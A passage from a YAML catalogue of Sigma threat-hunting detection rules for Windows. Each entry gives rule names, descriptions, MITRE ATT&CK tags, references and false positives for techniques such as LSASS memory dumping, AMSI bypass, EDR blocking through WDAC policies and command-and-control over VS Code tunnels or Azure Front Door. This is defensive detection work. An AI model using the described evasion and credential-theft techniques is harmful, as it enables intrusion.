  references:
  - https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/
  - https://www.virustotal.com/gui/file/3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac
  - https://docs.python.org/3/library/site.html
  false_positives:
  - Although .pth files are discouraged due to potential security implications, these
    are legitimate files by specification.
  notes: ''
- detection_id: a762e74f-4dce-477c-b023-4ed81df600f9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_event/file_event_win_scheduled_task_creation.yml
  name: Scheduled Task Created - FileCreation
  description: Detects the creation of a scheduled task via file creation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1053.005
  - attack.s0111
  - car.2013-08-001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/analytics/task_scheduling/
  - https://posts.specterops.io/abstracting-scheduled-tasks-3b6451f6a1c5
  false_positives:
  - Normal behaviour on Windows
  notes: ''
- detection_id: 297afac9-5d02-4138-8c58-b977bac60556
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_event/file_event_win_susp_binary_dropper.yml
  name: Creation of an Executable by an Executable
  description: Detects the creation of an executable by another executable.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.resource-development
  - attack.t1587.001
  - detection.threat-hunting
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Software installers
  - Update utilities
  - 32bit applications launching their 64bit versions
  notes: ''
- detection_id: 9661ec9d-4439-4a7a-abed-d9be4ca43b6d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_event/file_event_win_vscode_tunnel_indicators.yml
  name: VsCode Code Tunnel Execution File Indicator
  description: 'Detects the creation of a file with the name "code_tunnel.json" which
    indicate execution and usage of VsCode tunneling utility. Attackers can abuse
    this functionality to establish a C2 channel

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.threat-hunting
  time_window: ''
  references:
  - https://ipfyx.fr/post/visual-studio-code-tunnel/
  - https://badoption.eu/blog/2023/01/31/code_c2.html
  false_positives:
  - Legitimate usage of VsCode tunneling functionality will also trigger this
  notes: ''
- detection_id: 121b25f7-b9d6-4b37-afa0-cba317ec52f3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_event/file_event_win_wdac_policy_creation_in_codeintegrity_folder.yml
  name: WDAC Policy File Creation In CodeIntegrity Folder
  description: 'Attackers can craft a custom Windows Defender Application Control
    (WDAC) policy that blocks Endpoint Detection and Response (EDR) components while
    allowing their own malicious code. The policy is placed in the privileged Windows
    Code Integrity folder (C:\Windows\System32\CodeIntegrity\). Upon reboot, the policy
    prevents EDR drivers from loading, effectively bypassing security measures and
    may further enable undetected lateral movement within an Active Directory environment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://beierle.win/2024-12-20-Weaponizing-WDAC-Killing-the-Dreams-of-EDR/
  - https://www.virustotal.com/gui/file/d2a4f52a9923336f119a52e531bbb1e66f18322fd8efa9af1a64b94f4d36dc97
  false_positives:
  - May occur legitimately as part of admin activity, but rarely with interactive
    elevation.
  notes: ''
- detection_id: 4c55738d-72d8-490e-a2db-7969654e375f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_event/file_event_win_webdav_tmpfile_creation.yml
  name: WebDAV Temporary Local File Creation
  description: Detects the creation of WebDAV temporary files with potentially suspicious
    extensions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1566
  - T1584
  tags:
  - attack.initial-access
  - attack.resource-development
  - attack.t1584
  - attack.t1566
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.trellix.com/en-us/about/newsroom/stories/research/beyond-file-search-a-novel-method.html
  - https://micahbabinski.medium.com/search-ms-webdav-and-chill-99c5b23ac462
  - https://dear-territory-023.notion.site/WebDav-Share-Testing-e4950fa0c00149c3aa430d779b9b1d0f?pvs=4
  false_positives:
  - Legitimate use of WebDAV in an environment
  notes: ''
- detection_id: bbfd974c-248e-4435-8de6-1e938c79c5c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/file/file_rename/file_rename_win_non_dll_to_dll_ext.yml
  name: Non-DLL Extension File Renamed With DLL Extension
  description: 'Detects rename operations of files with non-DLL extensions to files
    with a DLL extension. This is often performed by malware in order to avoid initial
    detections based on extensions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_rename
  data_sources: []
  tactics: []
  techniques:
  - T1036.008
  tags:
  - attack.defense-evasion
  - attack.t1036.008
  - detection.threat-hunting
  time_window: ''
  references:
  - https://twitter.com/ffforward/status/1481672378639912960
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1036/T1036.md#atomic-test-1---system-file-copied-to-unusual-location
  false_positives:
  - Likely from installers and temporary locations
  notes: ''
- detection_id: facd1549-e416-48e0-b8c4-41d7215eedc8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/image_load/image_load_dll_amsi_uncommon_process.yml
  name: Amsi.DLL Load By Uncommon Process
  description: Detects loading of Amsi.dll by uncommon processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.defense-evasion
  - attack.impact
  - attack.t1490
  - detection.threat-hunting
  time_window: ''
  references:
  - https://infosecwriteups.com/amsi-bypass-new-way-2023-d506345944e9
  - https://github.com/TheD1rkMtr/AMSI_patch
  - https://github.com/surya-dev-singh/AmsiBypass-OpenSession
  false_positives:
  - Legitimate third party apps installed in "ProgramData" and "AppData" might generate
    some false positives. Apply additional filters accordingly
  notes: ''
- detection_id: e700ff14-1bff-4d1d-9438-738dff5f0466
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/image_load/image_load_dll_bitsproxy_load_by_uncommon_process.yml
  name: BITS Client BitsProxy DLL Loaded By Uncommon Process
  description: 'Detects an uncommon process loading the "BitsProxy.dll". This DLL
    is used when the BITS COM instance or API is used.

    This detection can be used to hunt for uncommon processes loading this DLL in
    your environment. Which may indicate potential suspicious activity occurring.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  - detection.threat-hunting
  time_window: ''
  references:
  - https://unicornofhunt.com/2025/05/22/When-Unicorns-Go-Quiet-BITS-Jobs-and-the-Art-of-Stealthy-Transfers/
  false_positives:
  - Allowed binaries in the environment that do BITS Jobs
  notes: ''
- detection_id: 0e277796-5f23-4e49-a490-483131d4f6e1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/image_load/image_load_dll_dbghelp_dbgcore_susp_load.yml
  name: Dbghelp/Dbgcore DLL Loaded By Uncommon/Suspicious Process
  description: 'Detects the load of dbghelp/dbgcore DLL by a potentially uncommon
    or potentially suspicious process.

    The Dbghelp and Dbgcore DLLs export functions that allow for the dump of process
    memory. Tools like ProcessHacker, Task Manager and some attacker tradecraft use
    the MiniDumpWriteDump API found in dbghelp.dll or dbgcore.dll.

    As an example, SilentTrynity C2 Framework has a module that leverages this API
    to dump the contents of Lsass.exe and transfer it over the network back to the
    attacker''s machine.

    Keep in mind that many legitimate Windows processes and services might load the
    aforementioned DLLs for debugging or other related purposes. Investigate the CommandLine
    and the Image location of the process loading the DLL.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
  - https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html
  - https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6
  false_positives:
  - Debugging scripts might leverage this DLL in order to dump process memory for
    further analysis.
  notes: ''
- detection_id: 666ecfc7-229d-42b8-821e-1a8f8cb7057c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/image_load/image_load_dll_system_drawing_load.yml
  name: System Drawing DLL Load
  description: Detects processes loading "System.Drawing.ni.dll". This could be an
    indicator of potential Screen Capture.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1113
  tags:
  - attack.collection
  - attack.t1113
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/16
  - https://github.com/OTRF/ThreatHunter-Playbook/blob/2d4257f630f4c9770f78d0c1df059f891ffc3fec/docs/evals/apt29/detections/7.A.1_3B4E5808-3C71-406A-B181-17B0CE3178C9.md
  false_positives:
  - False positives are very common from system and third party applications, activity
    needs to be investigated. This rule is best correlated with other events to increase
    the level of suspiciousness
  notes: ''
- detection_id: 3b92a1d0-8d4b-4d28-a1b4-1e29d49a6a3e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/image_load/image_load_dll_taskschd_by_process_in_potentially_suspicious_location.yml
  name: Task Scheduler DLL Loaded By Application Located In Potentially Suspicious
    Location
  description: 'Detects the loading of the "taskschd.dll" module from a process that
    located in a potentially suspicious or uncommon directory.

    The loading of this DLL might indicate that the application have the capability
    to create a scheduled task via the "Schedule.Service" COM object.

    Investigation of the loading application and its behavior is required to determining
    if its malicious.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.persistence
  - attack.execution
  - attack.privilege-escalation
  - attack.t1053.005
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.logpoint.com/en/blog/shenanigans-of-scheduled-tasks/
  - https://x.com/Max_Mal_/status/1826179497084739829
  false_positives:
  - Some installers might generate false positives, apply additional filters accordingly.
  notes: ''
- detection_id: c5f4b5cb-4c25-4249-ba91-aa03626e3185
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/image_load/image_load_office_excel_xll_load.yml
  name: Microsoft Excel Add-In Loaded
  description: Detects Microsoft Excel loading an Add-In (.xll) file
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/lnk-between-browsers
  false_positives:
  - The rules is only looking for ".xll" loads. So some false positives are expected
    with legitimate and allowed XLLs
  notes: ''
- detection_id: 1337afba-d17d-4d23-bd55-29b927603b30
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/image_load/image_load_office_word_wll_load.yml
  name: Microsoft Word Add-In Loaded
  description: 'Detects Microsoft Word loading an Add-In (.wll) file which can be
    used by threat actors for initial access or persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204.002
  tags:
  - attack.execution
  - attack.t1204.002
  - detection.threat-hunting
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence
  - https://nored0x.github.io/red-teaming/office-persistence/#what-is-a-wll-file
  false_positives:
  - The rules is only looking for ".wll" loads. So some false positives are expected
    with legitimate and allowed WLLs.
  notes: ''
- detection_id: 671bb7e3-a020-4824-a00e-2ee5b55f385e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/image_load/image_load_wmi_module_load_by_uncommon_process.yml
  name: WMI Module Loaded By Uncommon Process
  description: Detects WMI modules being loaded by an uncommon process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  - detection.threat-hunting
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190811-WMIModuleLoad/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3c21219b-49b5-4268-bce6-c914ed50f09c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/network_connection/net_connection_win_dfsvc_non_local_ip.yml
  name: Dfsvc.EXE Network Connection To Non-Local IPs
  description: Detects network connections from "dfsvc.exe" used to handled ClickOnce
    applications to non-local IPs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  tags:
  - attack.execution
  - attack.t1203
  - detection.threat-hunting
  time_window: ''
  references:
  - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
  false_positives:
  - False positives are expected from ClickOnce manifests hosted on public IPs and
    domains. Apply additional filters for the accepted IPs in your environement as
    necessary
  notes: ''
- detection_id: 4c5fba4a-9ef6-4f16-823d-606246054741
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/network_connection/net_connection_win_dfsvc_uncommon_ports.yml
  name: Dfsvc.EXE Initiated Network Connection Over Uncommon Port
  description: Detects an initiated network connection over uncommon ports from "dfsvc.exe".
    A utility used to handled ClickOnce applications.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  tags:
  - attack.execution
  - attack.t1203
  - detection.threat-hunting
  time_window: ''
  references:
  - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
  false_positives:
  - Unknown
  notes: ''
- detection_id: cfed2f44-16df-4bf3-833a-79405198b277
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/network_connection/net_connection_win_dllhost_non_local_ip.yml
  name: Dllhost.EXE Initiated Network Connection To Non-Local IP Address
  description: 'Detects Dllhost.EXE initiating a network connection to a non-local
    IP address.

    Aside from Microsoft own IP range that needs to be excluded. Network communication
    from Dllhost will depend entirely on the hosted DLL.

    An initial baseline is recommended before deployment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  - T1559.001
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.execution
  - attack.t1559.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://redcanary.com/blog/child-processes/
  - https://nasbench.medium.com/what-is-the-dllhost-exe-process-actually-running-ef9fe4c19c08
  false_positives:
  - Communication to other corporate systems that use IP addresses from public address
    spaces
  notes: ''
- detection_id: 468a8cea-2920-4909-a593-0cbe1d96674a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/network_connection/net_connection_win_hh_http_connection.yml
  name: HH.EXE Initiated HTTP Network Connection
  description: 'Detects a network connection initiated by the "hh.exe" process to
    HTTP destination ports, which could indicate the execution/download of remotely
    hosted .chm files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1218.001
  tags:
  - attack.defense-evasion
  - attack.t1218.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.splunk.com/en_us/blog/security/follina-for-protocol-handlers.html
  - https://github.com/redcanaryco/atomic-red-team/blob/1cf4dd51f83dcb0ebe6ade902d6157ad2dbc6ac8/atomics/T1218.001/T1218.001.md
  false_positives:
  - False positive is expected from launching "hh.exe" for the first time on a machine
    in a while or simply from help files containing reference to external sources.
    Best correlate this with process creation and file events.
  notes: ''
- detection_id: 8e5e38e4-5350-4c0b-895a-e872ce0dd54f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/network_connection/net_connection_win_msiexec_http.yml
  name: Msiexec.EXE Initiated Network Connection Over HTTP
  description: 'Detects a network connection initiated by an "Msiexec.exe" process
    over port 80 or 443.

    Adversaries might abuse "msiexec.exe" to install and execute remotely hosted packages.

    Use this rule to hunt for potentially anomalous or suspicious communications.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1218.007
  tags:
  - attack.defense-evasion
  - attack.t1218.007
  - detection.threat-hunting
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md
  false_positives:
  - Likely
  notes: ''
- detection_id: 1f21ec3f-810d-4b0e-8045-322202e22b4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/network_connection/net_connection_win_powershell_network_connection.yml
  name: Network Connection Initiated By PowerShell Process
  description: 'Detects a network connection that was initiated from a PowerShell
    process.

    Often times malicious powershell scripts download additional payloads or communicate
    back to command and control channels via uncommon ports or IPs.

    Use this rule as a basis for hunting for anomalies.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.youtube.com/watch?v=DLtJTxMWZ2o
  false_positives:
  - Administrative scripts
  - Microsoft IP range
  - Additional filters are required. Adjust to your environment (e.g. extend filters
    with company's ip range')
  notes: ''
- detection_id: 8cb4d14e-776e-43c2-8fb9-91e7fcea32b4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/network_connection/net_connection_win_susp_azurefd_connection.yml
  name: Potentially Suspicious Azure Front Door Connection
  description: 'Detects connections with Azure Front Door (known legitimate service
    that can be leveraged for C2)

    that fall outside of known benign behavioral baseline (not using common apps or
    common azurefd.net endpoints)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1090.004
  - T1102.002
  tags:
  - attack.command-and-control
  - attack.t1102.002
  - attack.t1090.004
  - detection.threat-hunting
  time_window: ''
  references:
  - https://lots-project.com/site/2a2e617a75726566642e6e6574
  - https://medium.com/r3d-buck3t/red-teaming-in-cloud-leverage-azure-frontdoor-cdn-for-c2-redirectors-79dd9ca98178
  - https://www.fortalicesolutions.com/posts/hiding-behind-the-front-door-with-azure-domain-fronting
  false_positives:
  - Results are not inherently suspicious, but should be investigated during threat
    hunting for potential cloud C2.
  - Organization-specific Azure Front Door endpoints
  notes: ''
- detection_id: bcb03938-9f8b-487d-8d86-e480691e1d71
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/network_connection/net_connection_win_susp_initaited_public_folder.yml
  name: Network Connection Initiated From Users\Public Folder
  description: 'Detects a network connection initiated from a process located in the
    "C:\Users\Public" folder.

    Attacker are known to drop their malicious payloads and malware in this directory
    as its writable by everyone.

    Use this rule to hunt for potential suspicious or uncommon activity in your environement.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  - detection.threat-hunting
  time_window: ''
  references:
  - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo
  false_positives:
  - Likely from legitimate third party application that execute from the "Public"
    directory.
  notes: ''
- detection_id: f3f3a972-f982-40ad-b63c-bca6afdfad7c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/pipe_created/pipe_created_sysinternals_psexec_default_pipe.yml
  name: PsExec Default Named Pipe
  description: Detects PsExec service default pipe creation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.jpcert.or.jp/english/pub/sr/ir_research.html
  - https://jpcertcc.github.io/ToolAnalysisResultSheet
  false_positives:
  - Unknown
  notes: ''
- detection_id: d7326048-328b-4d5e-98af-86e84b17c765
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_classic/posh_pc_alternate_powershell_hosts.yml
  name: Uncommon PowerShell Hosts
  description: Detects alternate PowerShell hosts potentially bypassing detections
    looking for powershell.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/190815-RemoteServiceInstallation/notebook.html
  false_positives:
  - Programs using PowerShell directly without invocation of a dedicated interpreter
  - MSP Detection Searcher
  - Citrix ConfigSync.ps1
  notes: ''
- detection_id: 812837bb-b17f-45e9-8bd0-0ec35d2e3bd6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_classic/posh_pc_bxor_operator_usage.yml
  name: bXOR Operator Usage In PowerShell Command Line - PowerShell Classic
  description: 'Detects powershell execution with that make use of to the bxor (Bitwise
    XOR).

    Attackers might use as an alternative obfuscation method to Base64 encoded commands.

    Investigate the CommandLine and process tree to determine if the activity is malicious.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_classic_start
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=46
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_arithmetic_operators?view=powershell-5.1
  false_positives:
  - Unknown
  notes: ''
- detection_id: ea207a23-b441-4a17-9f76-ad5be47d51d3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_module/posh_pm_susp_netfirewallrule_recon.yml
  name: Local Firewall Rules Enumeration Via NetFirewallRule Cmdlet
  description: Detects execution of "Get-NetFirewallRule" or "Show-NetFirewallRule"
    to enumerate the local firewall rules on a host.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_module
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  - T1518.001
  tags:
  - detection.threat-hunting
  - attack.discovery
  - attack.t1518.001
  - attack.t1016
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/netsecurity/get-netfirewallrule?view=windowsserver2022-ps
  - https://learn.microsoft.com/en-us/powershell/module/netsecurity/show-netfirewallrule?view=windowsserver2022-ps
  false_positives:
  - Administration scripts
  notes: ''
- detection_id: 6dc5d284-69ea-42cf-9311-fb1c3932a69a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_compress_archive_usage.yml
  name: Compress-Archive Cmdlet Execution
  description: 'Detects PowerShell scripts that make use of the "Compress-Archive"
    cmdlet in order to compress folders and files.

    An adversary might compress data (e.g., sensitive documents) that is collected
    prior to exfiltration in order to make it portable and minimize the amount of
    data sent over the network.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Collection
  - Exfiltration
  techniques:
  - T1560
  tags:
  - attack.exfiltration
  - attack.collection
  - attack.t1560
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560/T1560.md
  false_positives:
  - Likely
  notes: ''
- detection_id: 4e485d01-e18a-43f6-a46b-ef20496fa9d3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_mailbox_access.yml
  name: Windows Mail App Mailbox Access Via PowerShell Script
  description: Detects PowerShell scripts that try to access the default Windows MailApp
    MailBox. This indicates manipulation of or access to the stored emails of a user.
    E.g. this could be used by an attacker to exfiltrate or delete the content of
    the emails.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics: []
  techniques:
  - T1070.008
  tags:
  - attack.defense-evasion
  - attack.t1070.008
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/02cb591f75064ffe1e0df9ac3ed5972a2e491c97/atomics/T1070.008/T1070.008.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8d31dd2e-b582-48ca-826e-dcaa2c1ca264
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/powershell/powershell_script/posh_ps_new_netfirewallrule_allow.yml
  name: New Windows Firewall Rule Added Via New-NetFirewallRule Cmdlet - ScriptBlock
  description: 'Detects when a powershell script contains calls to the "New-NetFirewallRule"
    cmdlet in order to add a new firewall rule with an "Allow" action.

    '
